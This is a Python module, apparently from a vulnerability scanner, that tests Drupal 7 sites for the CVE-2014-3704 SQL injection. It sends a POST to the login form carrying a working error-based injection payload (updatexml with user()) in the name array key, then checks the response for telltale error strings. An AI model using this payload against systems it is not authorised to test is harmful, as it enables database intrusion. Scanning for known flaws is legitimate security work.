#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# from lib.tool import check

cve_2014_3704_payloads = [
    {
        'path': '?q=node&destination=node',
        'data': 'pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a'
    }
]
        
def cve_2014_3704_scan(self, clients):
    ''' 7.32之前的Drupal core 7.x中的数据库抽象API中的expandArguments函数, 
        无法正确构造准备好的语句, 这使得远程攻击者可以通过包含精心制作的密钥的数组进行SQL注入攻击
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2014-3704',
    }

    for payload in cve_2014_3704_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('DatabaseConnection-&gt;escapeLike()' in res.text) 
            and ('user_login_authenticate_validate' in res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
